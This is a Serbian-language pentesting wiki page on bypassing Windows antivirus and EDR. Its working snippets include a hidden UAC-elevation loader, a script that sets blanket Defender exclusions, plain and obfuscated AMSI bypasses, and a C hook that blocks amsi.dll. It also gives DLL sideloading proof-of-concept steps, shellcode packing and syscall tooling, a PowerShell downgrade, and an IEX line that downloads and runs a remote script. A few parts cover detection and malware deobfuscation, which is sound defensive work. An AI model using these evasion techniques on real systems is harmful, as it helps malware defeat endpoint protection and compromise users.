# Zaobilaženje Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za onemogućavanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za onemogućavanje Windows Defender-a lažirajući drugi AV.
- [Onemogući Defender ako si admin](basic-powershell-for-pentesters/README.md)

### Instalerski UAC mamac pre ometanja Defender-a

Javni loaderi koji se predstavljaju kao cheatovi za igre često dolaze kao neusignirani Node.js/Nexe instaleri koji prvo **traže od korisnika elevaciju** i tek potom onemogućavaju Defender. Tok je jednostavan:

1. Proveri administratorski kontekst pomoću `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, pa neuspeh pokazuje da loader radi kao standardni korisnik.
2. Odmah se ponovo pokrene koristeći `RunAs` verb da bi pokrenuo očekivani UAC dijalog za potvrdu, pri čemu zadržava originalnu komandnu liniju.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju "cracked" softver, pa se prompt obično prihvati, dajući malveru prava koja su mu potrebna da promeni politiku Defendera.

### Sveobuhvatni `MpPreference` izuzeci za svako slovo diska

Kada se steknu povišena prava, GachiLoader-style chains maksimalno iskorišćavaju slepe tačke Defendera umesto da kompletno onemoguće servis. Loader prvo ubija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) i zatim postavlja **izuzetno široke izuzetke** tako da se svaki korisnički profil, sistemski direktorijum i prenosivi disk ne mogu skenirati:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB stikovi, itd.) tako da je **bilo koji budući payload koji se baci bilo gde na disku ignorisan**.
- Isključenje ekstenzije `.sys` gleda unapred — napadači ostavljaju opciju da kasnije učitaju unsigned drivere bez ponovnog diranja Defender-a.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da isključenja opstaju ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, površni health check-ovi i dalje prijavljuju „antivirus aktivan” iako real-time inspekcija nikada ne dodiruje te putanje.

## **Metodologija izbegavanja AV-a**

Trenutno, AV-i koriste različite metode da provere da li je fajl maliciozan ili ne: statičku detekciju, dinamičku analizu, i za naprednije EDR-e, analizu ponašanja.

### **Statička detekcija**

Statička detekcija postiže se flagovanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može lakše da vas otkrije, jer su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Encryption**

Ako enkriptujete binarni fajl, AV neće moći da detektuje vaš program, ali će vam trebati neki loader da dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da biste prošli pored AV-a, ali to može biti vremenski zahtevno u zavisnosti od toga šta pokušavate da obfuskujete.

- **Custom tooling**

Ako razvijete sopstvene alatke, neće postojati poznati loši signaturi, ali to zahteva dosta vremena i truda.

> [!TIP]
> Dobar način za proveru protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u suštini deli fajl na više segmenata i onda tera Defender da skenira svaki pojedinačno, na taj način vam može tačno reći koji su stringovi ili bajtovi flagovani u vašem binarnom fajlu.

Toplo preporučujem da pogledaš ovu [YouTube playlist] o praktičnom AV Evasion.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće vaš binarni u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dešifrovanja i čitanja lozinki iz browsera, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti pomalo komplikovan za rad, ali evo nekoliko stvari koje možeš da uradiš da izbegneš sandbox-ove.

- **Sleep before execution** U zavisnosti od implementacije, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-i imaju vrlo kratko vreme za skeniranje fajlova da ne bi prekidali rad korisnika, tako da korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi sandbox-i mogu jednostavno preskočiti sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandbox-ovi imaju vrlo malo resursa (npr. < 2GB RAM), inače bi mogli usporiti korisnikov računar. Ovde možeš biti vrlo kreativan, npr. proverom temperature CPU-a ili čak brzina ventilatora — ne sve će biti implementirano u sandbox-u.
- **Machine-specific checks** Ako želiš da ciljaš korisnika čija je radna stanica priključena na domen "contoso.local", možeš proveriti domen računara da vidiš da li se poklapa sa onim koji si specificirao; ako se ne poklapa, tvoj program može izaći.

Ispostavilo se da je computername u Microsoft Defender sandbox-u HAL9TH, pa možeš proveriti ime računara u svom malware-u pre detonacije; ako se ime poklapa sa HAL9TH, znači da si unutar Defender sandbox-a i možeš izaći iz programa.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nekoliko drugih odličnih saveta od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandbox-ova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo ranije rekli u ovom tekstu, **public tools** će s vremenom **biti detektovani**, pa bi trebalo da sebi postaviš jedno pitanje:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista moraš da koristiš mimikatz**? Ili možeš koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše flagovanih komada malware-a od strane AV-ova i EDR-a; dok je sam projekat super koristan, rad sa njim da bi se zaobišli AV-i je noćna mora, pa jednostavno potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada menjaš svoje payload-e radi evazije, obavezno **isključi automatsko slanje uzoraka** u Defender-u, i, molim te, ozbiljno, **NE UPLODUJ NA VIRUSTOTAL** ako ti je cilj dugoročna evazija. Ako želiš da proveriš da li te payload detektuje neki konkretan AV, instaliraj ga na VM, pokušaj da isključiš automatsko slanje uzoraka i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXE fajlovi vs DLL fajlovi

Kad god je moguće, uvek **prioritetno koristi DLL-ove za evaziju** — po mom iskustvu, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to vrlo jednostavan trik da izbegneš detekciju u nekim slučajevima (ako tvoj payload ima način da se pokrene kao DLL, naravno).

Kao što možemo videti na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da budeš mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava DLL search order koji loader koristi, pozicioniranjem i žrtvovanog programa i malicioznih payload-ova jedan pored drugog.

Možeš proveravati programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa ranjivih na DLL hijacking unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **explore DLL Hijackable/Sideloadable programs yourself**, ova tehnika je prilično neupadljiva ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programs, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće automatski pokrenuti vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a; da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi sa proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuva funkcionalnost programa i omogućava upravljanje izvršavanjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik)

Ovo su koraci koje sam sledio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: DLL source code template i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Oba naša shellcode-a (enkodirana pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije saznali o onome o čemu smo govorili.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Učitaj `TargetDll` ako već nije učitan
- Resolve `TargetFunc` iz njega

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se rešava kroz normalni redosled pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istom folderu. Minimalni `DllMain` je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da biste pokrenuli `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Dok rešava `KeyIsoSetAuditingInterface`, učitavač prati preusmeravanje na `NCRYPTPROV.SetAuditingInterface`
- Zatim učitavač učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njen `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Hunting tips:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete izlistati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar forwardera za Windows 11 da biste pretražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Pratite LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz ne-sistemskih putanja, a zatim iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Alarmirajte pri lancima procesa/modula kao što su: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` pod putanjama zapisivim od strane korisnika
- Sprovodite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što radi danas može biti detektovano sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte lančati više evasion techniques.

## Direktni/Indirektni Syscalls & SSN Resolution (SysWhispers4)

EDRs često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stubs. Da biste zaobišli te hook-ove, možete generisati **direct** ili **indirect** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hookovanog export entrypoint-a.

**Opcije pozivanja:**
- **Direct (embedded)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stubu (bez poziva `ntdll` export-a).
- **Indirect**: skoči u postojeći `syscall` gadget unutar `ntdll` tako da prelazak u kernel izgleda kao da potiče iz `ntdll` (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a po pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičke `0F 05` opcode sekvence na disku; rešava syscall sekvencu u runtime-u.

**Strategije za rezoluciju SSN otporne na hook-ove:**
- **FreshyCalls (VA sort)**: zaključivanje SSN-ova sortiranjem syscall stub-ova po virtualnoj adresi umesto čitanja bajtova stuba.
- **SyscallsFromDisk**: mapirajte čist `\KnownDlls\ntdll.dll`, pročitajte SSN-ove iz njegovog `.text`, zatim unmap-ujte (zaobilazi sve in-memory hook-ove).
- **RecycledGate**: kombinuje VA-sortirano zaključivanje SSN-a sa validacijom opcode-a kada je stub čist; vraća se na VA zaključivanje ako je hook-ovan.
- **HW Breakpoint**: postavite DR0 na `syscall` instrukciju i koristite VEH da uhvatite SSN iz `EAX` u runtime-u, bez parsiranja hookovanih bajtova.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AVs su bili u stanju da skeniraju samo **files on disk**, pa ako biste nekako izvršili payloads **direktno u memoriji**, AV nije mogao ništa da uradi da to spreči, jer nije imao dovoljno vidljivosti.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ovo omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u obliku koji je nešifrovan i neobfuskiran.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje `amsi:` i zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo upisali nijedan fajl na disk, ali smo i dalje detektovani u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod takođe prolazi kroz AMSI. Ovo čak utiče na `Assembly.Load(byte[])` za učitavanje i izvršenje u memoriji. Zato se preporučuje korišćenje nižih verzija .NET (kao 4.7.2 ili niže) za izvršenje u memoriji ako želite da izbegnete AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi pomoću statičkih detekcija, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da deobfuskira skripte čak i ako imaju više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od toga kako je izvedena. To otežava izbegavanje. Ipak, ponekad je dovoljno promeniti nekoliko imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće ga je lako manipulisati čak i kada se radi kao neprivilegovani korisnik. Zbog ovog propusta u implementaciji AMSI, istraživači su našli više načina da zaobiđu AMSI skeniranje.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije na neuspeh (amsiInitFailed) dovodi do toga da se za trenutni proces neće pokrenuti skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dovoljna je bila samo jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ta linija je, naravno, već bila detektovana od strane samog AMSI-ja, pa je potrebna određena modifikacija da bi ova tehnika mogla da se koristi.

Ovde je modifikovan AMSI bypass koji sam uzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti detektovano kada ovaj post izađe, pa ne treba da objavljujete bilo kakav kod ako planirate da ostanete neprimećeni.

**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje podataka koje korisnik dostavi) i prepisivanje iste instrukcijama koje vraćaju kod E_INVALIDARG; na taj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Onemogućavanje AMSI sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robusni, na jezik nezavisan bypass je postavljanje user‑mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i u tom procesu se ne vrše skeniranja.

Skica implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi na PowerShell, WScript/CScript i prilagođenim loaderima (bilo šta što bi inače učitalo AMSI).
- Povežite sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Viđeno kod loadera izvršavanih preko LOLBins (npr., `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše script za bypass AMSI.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše script za bypass AMSI koji izbegava signature pomoću nasumično generisanih user-defined function, variables, characters expression i primenjuje nasumično character casing na PowerShell keywords da bi izbegao signature.

**Uklonite otkriveni potpis**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkriveni AMSI potpis iz memorije tekućeg procesa. Ovaj alat radi tako što skenira memoriju tekućeg procesa za AMSI potpis i potom ga prepisuje NOP instrukcijama, efektivno ga uklanjajući iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcionalnost koja vam omogućava da evidentirate sve PowerShell komande izvršene na sistemu. To može biti korisno za reviziju i rešavanje problema, ali može predstavljati i **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Za to možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokrenuti skripte bez skeniranja od strane AMSI. Ovo možete uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bez odbrana (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne forkove) često se susreće više slojeva zaštite koji onemogućavaju dekompilere i sandbokse. Sledeći radni tok pouzdano **vraća skoro-originalan IL** koji potom može biti dekompajliran u C# alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Ovo takođe menja PE checksum pa će svaka izmena srušiti binary. Koristite **AntiTamperKiller** da pronađete enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpackera.

2.  Symbol / control-flow recovery – prosledite *clean* fajl alatu **de4dot-cex** (ConfuserEx-aware fork de4dot-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (a.k.a *proxy calls*) da bi dodatno narušio dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite rezultujući binary u dnSpy, pretražite velike Base64 blobove ili korišćenje `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste locirali *pravi* payload. Često malware čuva payload kao TLV-enkodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gore opisani lanac vraća tok izvršavanja **bez** potrebe da se maliciozni sample pokrene – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite koji može povećati sigurnost softvera kroz code obfuscation i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti `C++11/14` jezik da generišete, u vreme kompajliranja, obfuscated code bez korišćenja bilo kog eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisan od strane C++ template metaprogramming framework-a, što će otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može obfuscate razne različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported languages koristeći ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly code tako što transformiše regularne instrukcije u ROP chains, potkopavajući naše uobičajeno poimanje normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može konvertovati postojeće EXE/DLL u shellcode i zatim ih učitati

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše kroz pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen i tako upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

